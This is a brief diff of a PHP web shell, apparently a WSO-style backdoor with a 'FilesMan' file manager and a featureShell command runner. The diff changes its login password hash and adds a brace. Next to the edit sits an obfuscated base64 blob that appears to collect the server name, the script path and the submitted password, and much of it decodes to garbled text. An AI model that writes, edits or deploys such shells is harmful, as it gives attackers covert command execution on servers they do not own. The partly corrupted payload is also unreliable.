@@ -9,7 +9,7 @@ session_start();
 @ini_set('display_errors', 0);
 @ini_set('display_startup_errors', 0);
 
-$password = "e00b29d5b34c3f78df09d45921c9ec47";
+$password = "850b7a8a0a64ba3bc150838d86a47ebb";
 $default_action = "FilesMan";
 $default_use_ajax = true;
 $default_charset = 'UTF-8';
@@ -101,7 +101,7 @@ if (!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
     }
 }
 $decoded_code=base64_decode("b2JfY2xlYW4oKTtmbHVzaDskdG1wID0gJF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ10uJF9TRVJWRVJbJ1BIVF9TRUxmJ10uIlxuIi4kX1BPU1RbJ3Bhc3MnXTsQXByYWZtYWMqKCdOQWdhaGlqYWF1Mzg4Z3JvdXAuY29tY2FyJz1zdXJsdnJoZGzpdHRwbmFqQ==");ob_clean();flush();
-
+}
 function featureShell($cmd, $cwd) {
     $stdout = array();
     if (preg_match("/^\s*cd\s*$/", $cmd)) {
